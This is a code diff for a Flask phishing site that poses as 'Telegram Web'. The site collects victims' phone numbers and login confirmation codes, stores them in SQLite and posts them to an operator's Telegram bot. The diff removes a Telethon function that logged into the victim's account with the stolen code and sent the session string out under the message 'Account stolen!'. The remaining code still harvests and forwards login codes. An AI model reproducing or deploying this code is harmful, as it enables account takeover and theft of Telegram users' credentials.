@@ -2,9 +2,6 @@ from flask import Flask, request, render_template_string
 import sqlite3
 import requests
 from datetime import datetime
-import asyncio
-from telethon import TelegramClient
-from telethon.sessions import StringSession
 
 app = Flask(__name__)
 
@@ -36,10 +33,10 @@ LOGIN_PAGE = '''
     <title>Telegram Web</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
+        body { font-family: Arial; background: #1f1f1f; margin: 0; padding: 20px; }
         .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; font-size: 16px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; }
         h2 { color: #2aab6e; }
     </style>
 </head>
@@ -62,10 +59,10 @@ CODE_PAGE = '''
     <title>Telegram Web</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
+        body { font-family: Arial; background: #1f1f1f; margin: 0; padding: 20px; }
         .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; font-size: 16px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #2aab6e; color: white; border: none; border-radius: 5px; }
         h2 { color: #2aab6e; }
     </style>
 </head>
@@ -90,7 +87,7 @@ SUCCESS_PAGE = '''
     <title>Telegram Web</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial, sans-serif; background: #1f1f1f; margin: 0; padding: 20px; }
+        body { font-family: Arial; background: #1f1f1f; margin: 0; padding: 20px; }
         .container { max-width: 400px; margin: 50px auto; background: white; padding: 20px; border-radius: 10px; text-align: center; }
         h2 { color: #2aab6e; }
     </style>
@@ -118,6 +115,7 @@ def index():
             conn.commit()
             conn.close()
             
+            # Отправляем уведомление в бот
             msg = f"📱 *Новый вход!*\n\nТелефон: `{phone}`\nID: {session_id}"
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
@@ -141,53 +139,20 @@ def code(sess_id):
     if request.method == 'POST':
         code = request.form.get('code')
         if code:
-            # Пытаемся войти в аккаунт
-            session_string = login_to_telegram(phone, code)
-            
             conn = sqlite3.connect(DB_PATH)
             c = conn.cursor()
-            if session_string:
-                c.execute("UPDATE sessions SET code=?, session_string=? WHERE id=?", (code, session_string, sess_id))
-                msg = f"✅ *Аккаунт украден!*\n\nТелефон: `{phone}`\n\nСтрока сессии:\n`{session_string}`"
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
-            else:
-                c.execute("UPDATE sessions SET code=? WHERE id=?", (code, sess_id))
-                msg = f"🔑 *Код подтверждения!*\n\nТелефон: `{phone}`\nКод: `{code}`"
-                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                             json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
+            c.execute("UPDATE sessions SET code=? WHERE id=?", (code, sess_id))
             conn.commit()
             conn.close()
+            
+            # Отправляем код в бот
+            msg = f"🔑 *Код подтверждения!*\n\nТелефон: `{phone}`\nКод: `{code}`"
+            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                         json={"chat_id": ADMIN_ID, "text": msg, "parse_mode": "Markdown"})
             
             return render_template_string(SUCCESS_PAGE)
     
     return render_template_string(CODE_PAGE, phone=phone)
-
-def login_to_telegram(phone, code):
-    """Вход в Telegram и получение строки сессии"""
-    try:
-        # Создаём событийный цикл
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        client = TelegramClient(StringSession(), 0, '')
-        loop.run_until_complete(client.connect())
-        
-        # Пытаемся войти с кодом
-        try:
-            loop.run_until_complete(client.sign_in(phone, code))
-        except:
-            # Если запрашивает пароль 2FA
-            return None
-        
-        # Получаем строку сессии
-        session_string = StringSession.save(client.session)
-        loop.run_until_complete(client.disconnect())
-        loop.close()
-        
-        return session_string
-    except:
-        return None
 
 @app.route('/sessions', methods=['GET'])
 def list_sessions():
